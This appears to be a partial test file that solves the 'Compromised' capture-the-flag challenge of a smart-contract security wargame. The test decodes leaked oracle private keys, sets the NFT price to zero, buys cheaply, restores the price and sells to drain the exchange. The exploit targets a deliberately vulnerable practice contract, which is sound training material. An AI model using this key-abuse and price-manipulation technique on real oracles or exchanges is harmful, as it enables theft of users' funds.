...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        const decoder = (leak) => {
            ...
            const hex = Buffer.from(base64, `base64`).toString(`utf8`)
            return hex
        };
        const leakedData = [
        ...
        const privateKey1 = decoder(leakedData[0]);
        const privateKey2 = decoder(leakedData[1]);
        const oracleSigner1 = new ethers.Wallet(privateKey1, ethers.provider);
        const oracleSigner2 = new ethers.Wallet(privateKey2, ethers.provider);
        console.log("Player balance: ", await ethers.provider.getBalance(player.address));

        tokenSymbol = await nftToken.symbol();

        await oracle.connect(oracleSigner1).postPrice(tokenSymbol, 0);
        await oracle.connect(oracleSigner2).postPrice(tokenSymbol, 0);
        console.log("DVNFT price (wei/ETH): ", String(await oracle.getMedianPrice(tokenSymbol)));

        await exchange.connect(player).buyOne({ value: 1 });
        console.log("Player balance AFTER bying 1 DVNFT : ", await ethers.provider.getBalance(player.address));

        await oracle.connect(oracleSigner1).postPrice(tokenSymbol, INITIAL_NFT_PRICE);
        await oracle.connect(oracleSigner2).postPrice(tokenSymbol, INITIAL_NFT_PRICE);
        console.log("DVNFT price (wei/ETH): ", String(await oracle.getMedianPrice(tokenSymbol)));


        await nftToken.connect(player).approve(exchange.address, 0);
        await exchange.connect(player).sellOne(0);
        console.log("Player balance AFTER selling 1 DVNFT : ", await ethers.provider.getBalance(player.address));
        console.log("Exchange balance AFTER: ", await ethers.provider.getBalance(exchange.address));
